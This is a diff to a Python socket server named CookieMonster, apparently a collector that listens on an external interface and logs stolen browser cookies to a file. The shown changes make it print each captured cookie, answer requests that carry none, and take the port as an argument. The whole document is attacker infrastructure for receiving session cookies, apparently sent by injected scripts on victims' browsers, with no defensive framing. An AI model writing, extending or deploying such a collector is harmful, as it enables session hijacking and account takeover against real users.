@@ -1,6 +1,7 @@
 #!/usr/bin/python
 
 import re
+import sys
 import threading
 import SocketServer
 
@@ -29,18 +30,24 @@ class CookieMonster(SocketServer.BaseRequestHandler):
     cookie = "no cookie"
     if m is None:
       print("No cookie provided in request")
+      self.request.send("no cookies :(\n")
     else:
       with open(cookie_jar, "a") as f:
+        print("Cookie found in request!")
+        print("cookie: {}".format(m.group(1)))
         f.write("{}\n".format(m.group(1)))
         cookie = m.group(1)
 
-    self.request.send(cookie)
+    self.request.send(cookie + "\n")
     return
 
   def finish(self):
     return SocketServer.BaseRequestHandler.finish(self)
 
 if __name__ == '__main__':
+  if len(sys.argv) > 1:
+    port = int(sys.argv[1])
+
   print("Starting collector on (addr={}, port={})".format(address, port))
 
   # Listen on the external interface
